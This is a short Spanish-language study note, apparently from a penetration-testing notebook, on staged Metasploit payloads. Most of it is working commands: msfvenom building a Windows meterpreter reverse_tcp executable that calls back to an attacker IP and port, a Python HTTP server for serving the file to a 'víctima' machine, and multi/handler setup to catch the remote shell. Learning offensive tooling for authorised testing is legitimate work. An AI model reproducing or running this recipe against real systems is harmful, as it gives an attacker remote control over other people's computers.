#payload #explotacion 

---------
Los de este tipo envían el payload de forma fragmentada, mientras que los de tipo [[Non-Staged]] no lo hacen.

- Suelen ser menos estables
- Payload más pequeños
- Menos detectables
- Personalizables

Una forma de crear payloads **staged** es de la siguiente manera, usando el [[MsfVenom]] con el siguiente código de ejecución:

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.20.16 LPORT=4646 -f exe -o reverse.exe`

Posteriormente, una vez ganado el acceso en la máquina víctima, con el siguiente comando abre un servidor en Python3 y descargas el virus en la máquina víctima:

`python3 -m http.server 80`

Una vez descargado, mediante Metasploit accedes a la consola operativa del payload con los siguientes comandos:

`msfconsole`

`msfdb run`

Luego, estando en la consola, realiza lo siguiente:

`use exploit/multi/handler`

Seteamos el payload que vamos a utilizar:

`set payload windows/x64/meterpreter/reverse_tcp`

Seteamos nuestra IP y puerto de atacante:

`set LHOST 192.168.20.16`

`set LPORT 4646`

Finalmente, ejecutamos con el comando **run**.